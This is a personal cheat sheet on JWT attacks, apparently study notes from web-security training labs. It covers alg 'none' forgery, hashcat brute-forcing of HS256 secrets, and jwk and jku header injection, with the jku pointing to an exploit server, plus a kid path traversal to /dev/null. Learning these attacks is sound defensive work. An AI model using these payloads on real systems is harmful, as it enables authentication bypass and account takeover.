# JWT
- Decode Tools: [JWT Decoder](https://www.jwt.io/) and Burpsuite

| Tipo de Clave     | Algoritmos JWT Comunes        | Caso de Uso Principal                                      |
|-------------------|--------------------------------|-------------------------------------------------------------|
| **Symmetric Key** | HS256, HS384, HS512            | Sistemas internos donde se comparte una única clave secreta. |
| **RSA Key**       | RS256, PS256 *(recomendado)*   | APIs públicas y microservicios; permite verificación mediante clave pública. |
| **EC Key**        | ES256, ES384, ES512            | Entornos que requieren alta eficiencia y menor tamaño de clave. |
| **OKP**           | EdDSA                          | Alternativa moderna, segura y eficiente a las claves EC.    |



<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/7d2ae94f-851c-419a-92e8-babaaa454ff4" />

# COMMON ATTACKS
## Accepting tokens with no signature
```
 "alg": "none"
```
Changing parameters
```
{
    "username": "carlos",
    "isAdmin": false
}
```
## Brute-forcing secret keys
```bash
# HS256
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
## JWT header parameter injections

- alg: mandatory
- jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
- jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
- kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.
### Injecting self-signed JWTs via the jwk parameter
Note: Only for Asymmetric Keys and use the option Attack -> Embdded JWK
```bash
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
## Injecting self-signed JWTs via the jku parameter
Note: JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /.well-known/jwks.json
1. Find the url where stotre jwks.json
2. Create a random RSA Key
3. Create or Copy RSA Key
```bash
{
    "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "ae125b7c-41a1-44de-9564-6616f85e259b",
    "n": "olG-J-_2UqeaKWtnHxBczrlRWZdk0DL70GFhYiQKplRk72PMX-BElSwOhq7TCX7FVAIgaf1iaZsHymiXzW-2pABybXND0dDczDs1Z-hFvNekj-xpngBbxjeZEWIG9JV158lJqvbpcI-cRsDSE05t-ojSomhcEEmYl28XHQ9vzYK5tfARdE2Tp9Ra2Uj8IcTwUQoQjSUlpOPUdTtKLKX7XkAS3NJtG4gEVO1DcFx513TN628YXyIERC6E97lgM08ChrkD3LcPDzaHL52YnDugkbYS46gmZaY8v9Tp7UVvD9_aBMkjSr3JjgGW9qxibQstQGEFuQxnczu7ToxQtwz79w"
        }
    ]
}
```
5. Upload kid and create jku parameter
```bash
{
    "kid": "ae125b7c-41a1-44de-9564-6616f85e259b",
    "alg": "RS256",
    "jku": "https://exploit-0a0d0018034482a8838c047301c20056.exploit-server.net/exploit"
}
```
6. Finally I had to upload signature
## Injecting self-signed JWTs via the kid parameter
1. Create a random Symmetric Key
2. Upload "k" paramater for a null bytes in base64 (AA==)
```bash
{
    "kty": "oct",
    "kid": "6ea917a4-a32d-4b16-abd2-812fa49cdcde",
    "k": "AA=="
}
```
3. Upload kid
```bash
{
    "kid": "../../../../../../../../../../../../dev/null",
    "alg": "HS256"
}
```
4. Finally I had to upload signature
